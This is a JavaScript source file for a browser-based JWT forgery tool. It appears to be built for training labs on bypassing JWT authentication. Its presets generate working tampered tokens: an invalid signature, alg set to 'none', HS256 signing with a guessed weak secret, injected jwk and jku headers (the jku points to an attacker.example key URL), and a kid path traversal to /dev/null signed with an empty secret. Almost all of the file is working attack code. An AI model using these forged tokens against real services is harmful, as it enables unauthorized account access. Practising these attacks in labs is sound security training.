const sourceToken = document.getElementById('sourceToken');
const reloadBtn = document.getElementById('reloadBtn');
const decodeError = document.getElementById('decodeError');
const headerOut = document.getElementById('headerOut');
const payloadOut = document.getElementById('payloadOut');
const payloadEditor = document.getElementById('payloadEditor');
const extraInput = document.getElementById('extraInput');
const generateBtn = document.getElementById('generateBtn');
const resultToken = document.getElementById('resultToken');
const attackNotes = document.getElementById('attackNotes');
const copyBtn = document.getElementById('copyBtn');

let selectedAttack = 'unverified-signature';

sourceToken.value = localStorage.getItem('jwt.source') || '';
decodeJwt();

reloadBtn.addEventListener('click', decodeJwt);

for (const btn of document.querySelectorAll('[data-attack]')) {
  btn.addEventListener('click', () => {
    selectedAttack = btn.dataset.attack;
    for (const b of document.querySelectorAll('[data-attack]')) {
      b.classList.toggle('secondary', b !== btn);
    }
    attackNotes.textContent = getPresetHint(selectedAttack);
  });
}

generateBtn.addEventListener('click', async () => {
  try {
    decodeError.textContent = '';
    const token = sourceToken.value.trim();
    const [headerB64, , signatureB64] = token.split('.');
    const baseHeader = parsePart(headerB64);
    const payload = JSON.parse(payloadEditor.value);
    const opt = parseOptionalInput(extraInput.value);

    let nextHeader = { ...baseHeader };
    let nextSig = signatureB64 || '';
    let notes = [];

    if (selectedAttack === 'unverified-signature') {
      nextSig = 'tampered-signature';
      notes = [
        'Lab: JWT authentication bypass via unverified signature.',
        'Payload is modified but signature is intentionally invalid.',
        'If accepted, target is not validating signatures.',
      ];
    }

    if (selectedAttack === 'flawed-signature') {
      nextHeader.alg = 'none';
      nextSig = '';
      notes = [
        'Lab: JWT authentication bypass via flawed signature verification.',
        'Sets header alg to none and removes signature.',
        'If accepted, server likely trusts client-supplied algorithm.',
      ];
    }

    if (selectedAttack === 'weak-signing-key') {
      const secret = opt.secret || extraInput.value || 'secret1';
      nextHeader.alg = 'HS256';
      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await hmacSha256Base64url(signingInput, secret);
      resultToken.value = `${signingInput}.${nextSig}`;
      attackNotes.textContent = [
        'Lab: JWT authentication bypass via weak signing key.',
        `Signed with candidate secret: "${secret}".`,
        'Try dictionary/common secrets to confirm predictable HMAC keys.',
      ].join('\n');
      return;
    }

    if (selectedAttack === 'jwk-header-injection') {
      nextHeader.alg = 'RS256';
      const publicJwk = opt.publicJwk || {
        kty: 'RSA',
        e: 'AQAB',
        n: '<replace-with-public-modulus>',
      };
      nextHeader.jwk = publicJwk;

      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      if (opt.privateJwk) {
        nextSig = await rs256SignBase64url(signingInput, opt.privateJwk);
        notes.push('Signed with provided private JWK (RS256).');
      } else {
        nextSig = '<provide-privateJwk-to-sign>';
      }

      notes.unshift(
        'Lab: JWT authentication bypass via jwk header injection.',
        'Injects attacker-controlled public key into jwk header.',
      );
      notes.push('Optional JSON input: {"publicJwk": {...}, "privateJwk": {...}}');
    }

    if (selectedAttack === 'jku-header-injection') {
      nextHeader.alg = 'RS256';
      nextHeader.jku = opt.jku || 'https://attacker.example/jwks.json';
      nextHeader.kid = opt.kid || 'attacker-key-1';

      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      if (opt.privateJwk) {
        nextSig = await rs256SignBase64url(signingInput, opt.privateJwk);
        notes.push('Signed with provided private JWK (RS256).');
      } else {
        nextSig = '<provide-privateJwk-to-sign>';
      }

      notes.unshift(
        'Lab: JWT authentication bypass via jku header injection.',
        'Forces verification key fetch from attacker-controlled JWKS URL.',
      );
      notes.push('Optional JSON input: {"jku":".../jwks.json","kid":"...","privateJwk":{...}}');
    }

    if (selectedAttack === 'kid-path-traversal') {
      nextHeader.alg = 'HS256';
      nextHeader.kid = '../../../../../../../dev/null';
      const secret = opt.secret || '';
      const signingInput = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}`;
      nextSig = await hmacSha256Base64url(signingInput, secret);
      resultToken.value = `${signingInput}.${nextSig}`;
      attackNotes.textContent = [
        'Lab: JWT authentication bypass via kid header path traversal.',
        'kid points to /dev/null path traversal target.',
        'Signed using empty secret by default (override with JSON {"secret":"..."}).',
        'In Burp JWT Editor, you can also test k = AA== scenario as described.',
      ].join('\n');
      return;
    }

    const finalToken = `${base64urlJson(nextHeader)}.${base64urlJson(payload)}.${nextSig}`;
    resultToken.value = finalToken;
    attackNotes.textContent = notes.join('\n') || 'No notes.';
  } catch (err) {
    decodeError.textContent = `Generation error: ${err.message}`;
  }
});

copyBtn.addEventListener('click', async () => {
  await navigator.clipboard.writeText(resultToken.value);
  attackNotes.textContent += '\nCopied to clipboard.';
});

function getPresetHint(key) {
  const hints = {
    'unverified-signature': 'Will generate token with invalid signature for signature-validation bypass checks.',
    'flawed-signature': 'Will generate alg=none token with empty signature.',
    'weak-signing-key': 'Will sign HS256 token using supplied secret (or secret1).',
    'jwk-header-injection': 'Optional JSON: {"publicJwk": {...}, "privateJwk": {...}}',
    'jku-header-injection': 'Optional JSON: {"jku":"https://.../jwks.json","kid":"...","privateJwk": {...}}',
    'kid-path-traversal': 'Will set kid traversal path and sign with empty/default secret.',
  };

  return hints[key] || 'Choose preset and generate.';
}

function parseOptionalInput(raw) {
  if (!raw || !raw.trim()) return {};
  if (raw.trim().startsWith('{')) return JSON.parse(raw);
  return {};
}

function decodeJwt() {
  decodeError.textContent = '';
  try {
    const token = sourceToken.value.trim();
    if (!token || token.split('.').length !== 3) {
      throw new Error('JWT must have 3 parts.');
    }

    const [headerB64, payloadB64] = token.split('.');
    const header = parsePart(headerB64);
    const payload = parsePart(payloadB64);

    headerOut.textContent = JSON.stringify(header, null, 2);
    payloadOut.textContent = JSON.stringify(payload, null, 2);
    payloadEditor.value = JSON.stringify(payload, null, 2);
    localStorage.setItem('jwt.source', token);
  } catch (err) {
    decodeError.textContent = `Decode error: ${err.message}`;
  }
}

function parsePart(part) {
  const json = atob(base64urlToBase64(part));
  return JSON.parse(json);
}

function base64urlJson(obj) {
  return base64ToBase64url(btoa(JSON.stringify(obj)));
}

function base64urlToBase64(input) {
  const pad = '='.repeat((4 - (input.length % 4 || 4)) % 4);
  return (input + pad).replace(/-/g, '+').replace(/_/g, '/');
}

function base64ToBase64url(input) {
  return input.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
}

async function hmacSha256Base64url(message, secret) {
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign'],
  );

  const signature = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(message));
  const bytes = new Uint8Array(signature);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return base64ToBase64url(btoa(binary));
}

async function rs256SignBase64url(message, privateJwk) {
  const key = await crypto.subtle.importKey(
    'jwk',
    privateJwk,
    {
      name: 'RSASSA-PKCS1-v1_5',
      hash: 'SHA-256',
    },
    false,
    ['sign'],
  );

  const signature = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', key, new TextEncoder().encode(message));
  const bytes = new Uint8Array(signature);
  let binary = '';
  for (const b of bytes) binary += String.fromCharCode(b);
  return base64ToBase64url(btoa(binary));
}
